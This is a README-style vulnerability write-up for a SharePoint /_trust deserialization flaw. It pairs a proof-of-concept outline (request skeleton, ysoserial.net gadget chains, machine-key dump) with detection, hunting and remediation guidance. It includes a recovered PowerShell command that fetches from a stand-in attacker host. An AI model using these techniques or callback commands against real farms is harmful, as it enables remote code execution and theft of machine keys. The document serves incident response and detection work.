# SharePoint `/_trust` WS-Federation Deserialization — PoC & Detection Notes

> 📖 **Live writeup (GitHub Pages):** https://sp-poc.wismansec.com/
> — branded HTML report of everything below.
>
> **Affected:** SharePoint Server **2016, 2019, and Subscription Edition**.

Reconstruction of a SharePoint Server (Subscription Edition) intrusion in an isolated lab,
built to (a) understand the full attacker capability, (b) determine what a defender should hunt
for — including stealthy persistence — and (c) share a light PoC to aid other investigators.

> ⚠️ **Authorized research only.** Everything here was performed on isolated, personally-owned
> lab hardware and accounts, against a build deliberately left unpatched for the test. The
> underlying issue is **fixed by the vendor** — apply the current updates. Do **not** run this
> against systems you do not own and have explicit authorization to test. Machine-key values,
> internal hostnames/IPs, and callback domains in the real capture have been **redacted** here.

- **By:** WismanSec
- **Fix:** July 2026 updates (**KB5002882**)
- **Related CVEs** (this cluster, CISA KEV-listed): CVE-2026-50522, CVE-2026-45659, CVE-2026-56164, CVE-2026-58644
- **Vulnerability class:** the `/_trust` SecurityContextToken BinaryFormatter deserialization family

---

## TL;DR for responders

- A single unauthenticated `POST /_trust/default.aspx` (WS-Federation sign-in) carrying a
  malicious `SecurityContextToken` triggers **BinaryFormatter deserialization** in the
  SharePoint worker (`w3wp.exe`), yielding **remote code execution as the web-app pool identity**.
- The **same primitive** can dump the farm **machine keys** (ValidationKey/DecryptionKey)
  entirely in-process — in a default-config farm, **no child process, no AV alert, no beacon**
  (AMSI/EDR posture can change this — see §5). Those keys let an attacker forge
  `__VIEWSTATE`/auth tokens **that survive patching.**
- **Patching is not enough. Rotate machine keys** on any farm you believe was reached, and hunt
  the `/_trust` request signature — it is the one artifact present in *every* variant.

---

## 1. The vulnerability

SharePoint exposes a WS-Federation passive sign-in endpoint at `/_trust/default.aspx`. A crafted
sign-in response (`wa=wsignin1.0` + `wresult=<RequestSecurityTokenResponse>`) embeds a
`SecurityContextToken` whose `<Cookie>` element is a **base64, DEFLATE-compressed
BinaryFormatter stream**. Server-side, that cookie is decompressed and **deserialized without
type restriction**, so a gadget chain (via `ysoserial.net`) executes attacker-controlled code
inside `w3wp.exe`.

Request skeleton (unauthenticated):

```
POST /_trust/default.aspx HTTP/1.1
Content-Type: application/x-www-form-urlencoded

wa=wsignin1.0&wctx=<url>&wresult=<RequestSecurityTokenResponse>...
  <SecurityContextToken><Cookie>BASE64(DEFLATE(BinaryFormatter payload))</Cookie>...
```

## 2. Two chains from one primitive

| Chain | Gadget | Effect | Output channel |
|---|---|---|---|
| **OOB RCE** | `TypeConfuseDelegate` → `-EncodedCommand` PowerShell | code execution as pool identity | out-of-band (HTTP/DNS beacon) |
| **Machine-key disclosure** | `ActivitySurrogateDisableTypeCheck` → `ActivitySurrogateSelectorFromFile` (compiles `KeyDump.cs` in-proc) | dumps ValidationKey/DecryptionKey | inline in the HTTP response |

Scripts (sanitized) in [`scripts/`](scripts/): a parameterized OOB RCE and the two-stage
key-dump. Payload delivery uses PowerShell **`-EncodedCommand`** so multi-statement payloads
survive the `cmd.exe`/transport layers intact (no `;`/`&&` quoting breakage).

## 3. Lab

Single SharePoint SE farm (build pinned pre-fix), app-pool identity `LAB\sp_pool`, PowerShell
**5.1**, **Microsoft Defender** on with cloud protection. Telemetry (Windows Event Log, SharePoint
logs, Defender for Endpoint) shipped to a SIEM; attacker host ran `ysoserial.net`; an
`interactsh` client provided the OOB listener. Addresses/domains redacted.

## 4. Results — invocation → artifact matrix

Every row is one real detonation; artifacts pulled from the SIEM + OOB listener per run.

| Invocation | Process tree (as `LAB\sp_pool`, High) | Defender | OOB beacon | Primary artifacts |
|---|---|---|---|---|
| OOB RCE, **default** | `w3wp.exe → cmd.exe → powershell.exe → conhost.exe` | **`Behavior:Win32/WebshellLauncher.A`** (EID 1116 detect / 1117 Remove) | **landed** (race) | 4688 tree; Defender 1116/1117; `/_trust` POST |
| OOB RCE, **`-RawCmd`** | `w3wp.exe → powershell.exe → conhost.exe` (no cmd) | **none** | landed (DNS+HTTP) | 4688 tree; `/_trust` POST; beacon |
| OOB RCE, **`-DropFile`** | `w3wp.exe → powershell.exe` | none | landed | file write to `…\TEMPLATE\LAYOUTS\` (not in object-access-audited log) |
| OOB RCE, **`-Diag`** | `w3wp.exe → powershell.exe → whoami.exe` | none | landed | env disclosure exfil: `{host, whoami, PSver, LanguageMode}` |
| **Machine-key dump** | *(none — in-process)* | **none** | *(none)* | **only** the `/_trust` POST + anomalous response carrying the keys |

Key command line recovered verbatim from **Security 4688** (encoding ≠ evasion):

```
"C:\Windows\System32\cmd.exe" /c powershell.exe -NoProfile -NonInteractive -EncodedCommand <base64>
   → decodes to: iwr -UseBasicParsing 'http://<attacker-oast>/c'
```

`-Diag` disclosure captured at the OOB listener (URL-decoded):

```json
{ "host": "SHAREPOINT01", "who": "LAB\\sp_pool", "v": "5.1.20348.558", "lm": "FullLanguage" }
```

## 5. Detection & hunting

**The one signature present in every variant** — hunt this first:

- IIS / SharePoint logs: `POST /_trust/default.aspx` with body `wa=wsignin1.0` and a `wresult`
  containing `RequestSecurityTokenResponse` + `SecurityContextToken`/`<Cookie>`. Unauthenticated,
  often anomalous User-Agent, frequently HTTP 200 **or** a reset — status is **not** reliable.

**Process-based (RCE variants only):**

- `w3wp.exe` spawning `cmd.exe` **or `powershell.exe` directly**. The `-RawCmd` variant removes
  the `cmd.exe` hop and **evades `WebshellLauncher.A`** — so **do not key solely on `w3wp→cmd`.**
- Any `powershell.exe -EncodedCommand` under `w3wp` — decode the blob straight from **4688**
  (it is not obfuscated at rest).
- `w3wp.exe → whoami.exe` (recon), or child `conhost.exe`.

**Two caveats that change response decisions:**

1. **Detection ≠ prevention.** Where Defender fired `WebshellLauncher.A` and *removed* the chain,
   the OOB beacon still completed in one run before remediation won the race. **Treat any such
   detection as possible successful exfil — pull DNS/proxy/outbound for the callback domain around
   the detection time.**
2. **The key-dump is stealthy — but AMSI-dependent.** In the default-config farm (Defender AV) it
   ran in-process with **no 4688 child, no Defender event, no beacon** — only the `/_trust` request +
   response betray it. Visibility depends on AMSI/EDR posture: with SharePoint's AMSI integration
   enabled the request body is exposed to AV, and a **CrowdStrike** detection of this chain was
   observed separately. Verify your AMSI posture; don't assume invisibility.

MITRE-ish: T1190 (exploit public-facing app) · T1059.001 (PowerShell) · T1552 (unsecured
credentials / machine keys) · T1550 (use of forged auth material, post-theft).

## 6. Remediation

1. **Patch** to the fixed SharePoint build.
2. **Rotate machine keys** (`Set-SPMachineKey` / update `web.config` machineKey + `IISReset`) on
   any farm potentially reached — patching does **not** revoke keys an attacker already stole.
3. Hunt historical IIS logs for the `/_trust` signature above; if present, assume key compromise.
4. Review for forged `__VIEWSTATE` / anomalous auth after the first-seen date.

## 7. Repo layout

```
README.md            – this document
scripts/             – sanitized PoC scripts (OOB RCE + machine-key dump)
detection/           – hunt queries / IOC list
artifacts/           – redacted example artifacts (process trees, Defender events, beacons)
LICENSE, DISCLAIMER.md
```
